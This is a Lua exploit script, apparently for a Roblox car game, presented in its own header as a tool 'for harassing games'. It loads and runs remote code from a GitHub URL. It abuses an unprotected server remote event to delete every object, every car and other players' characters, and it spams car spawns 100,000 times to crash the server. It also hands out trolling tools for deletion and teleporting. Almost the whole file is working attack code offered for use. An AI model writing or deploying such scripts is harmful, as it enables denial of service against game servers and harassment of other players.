--[[
    FestivalWare.lua

    A script by darraghd493/doge2018 for harassing games.
    This script is free to use and modify, but please give credit to doge2018.

    This script is for a game and is designed to be used by the loader.
]]

local UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/darraghd493/FestivalWare/master/src/ui/UI.lua"))()
local Window = UI:CreateWindow("FestivalWare")
local Server = Window:CreateTab("Server")
local Settings = Window:CreateTab("Settings")

local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")

local Mouse = Players.LocalPlayer:GetMouse()
local Cars = {}

for i, gui in ipairs(StarterGui:GetChildren()) do
    if gui.Name == "ScreenGui" then
        for v, frame in ipairs(gui:GetChildren()) do
            if frame.Name == "Frame1" and frame:FindFirstChild("Frame", false) then
                for x, car in ipairs(frame.Frame:GetChildren()) do
                    if car:IsA("ImageButton") then
                        table.insert(Cars, car.Name)
                    end
                end
            end
        end
    end
end

Server:CreateLabel("Destroy")
Server:CreateButton("Destroy Everything", function()
    for i, v in pairs(Workspace:GetChildren()) do
        ReplicatedStorage:FindFirstChild("Delete\208\161ar1"):FireServer(v)
    end
    Window:CreateNotification("FestivalWare", "Destroyed everything in the workspace.")
end)

Server:CreateButton("Destroy All Cars", function()
    for i, v in pairs(Workspace:GetChildren()) do
        if string.match(v.Name, "Car") then
            ReplicatedStorage:FindFirstChild("Delete\208\161ar1"):FireServer(v)
        end
    end
    Window:CreateNotification("FestivalWare", "Destroyed all cars in the workspace.")
end)

Server:CreateButton("Destroy All Players", function()
    for i, v in pairs(Players:GetChildren()) do
        ReplicatedStorage:FindFirstChild("Delete\208\161ar1"):FireServer(v.Character)
    end
    Window:CreateNotification("FestivalWare", "All players have been destroyed!")
end)

Server:CreateButton("Destroy Other Players", function()
    for i, v in pairs(Players:GetChildren()) do
        if v ~= Players.LocalPlayer then
            ReplicatedStorage:FindFirstChild("Delete\208\161ar1")
:FireServer(v.Character)
        end
    end
    Window:CreateNotification("FestivalWare", "Other players have been destroyed!")
end)

Server:CreateLabel("Crash")
Server:CreateButton("Model Crash", function()
    for i=1,100000 do
        ReplicatedStorage.SpawnCar:FireServer(Cars[math.random(1, #Cars)])
    end
    Window:CreateNotification("FestivalWare", "The server has been crashed.")
end)

Server:CreateLabel("Trolling")
Server:CreateButton("Give CarTools", function()
    local Hammer = Instance.new("HopperBin")
    Hammer.Parent = Players.LocalPlayer.Backpack
    Hammer.Name = "Hammer"
    Hammer.BinType = "Script"

    Hammer.Selected:Connect(function(input)
        input.Button1Down:Connect(function()
            local part = Mouse.Target
            if part:IsA("BasePart") then
                ReplicatedStorage:FindFirstChild("Delete\208\161ar1")
    :FireServer(part)
            end
        end)
    end)
     
    local NewCar = Instance.new("HopperBin")
    NewCar.Parent = Players.LocalPlayer.Backpack
    NewCar.Name = "New Car"
    NewCar.BinType = "Script"

    NewCar.Selected:Connect(function(input) 
        input.Button1Down:Connect(function()
            local HumanoidRootPart = Players.LocalPlayer.Character.HumanoidRootPart
            local originalCF = HumanoidRootPart.CFrame

            HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0, 2, 0)
            wait(0.1)
            ReplicatedStorage.SpawnCar:FireServer(Cars[math.random(1, #Cars)])
            wait(0.1)
            HumanoidRootPart.CFrame = originalCF
        end)
    end)
     
    local ClickTP = Instance.new("HopperBin")
    ClickTP.Parent = Players.LocalPlayer.Backpack
    ClickTP.Name = "ClickTP"
    ClickTP.BinType = "Script"

    ClickTP.Selected:Connect(function(input) 
        input.Button1Down:Connect(function()
            local HumanoidRootPart = Players.LocalPlayer.Character.HumanoidRootPart
            HumanoidRootPart.CFrame = Mouse.Hit + Vector3.new(0, 2, 0)
        end)
    end)

    Window:CreateNotification("FestivalWare", "CarTools have been given to you.")
end)

Settings:CreateButton("Close", function()
    Window:Close()
end)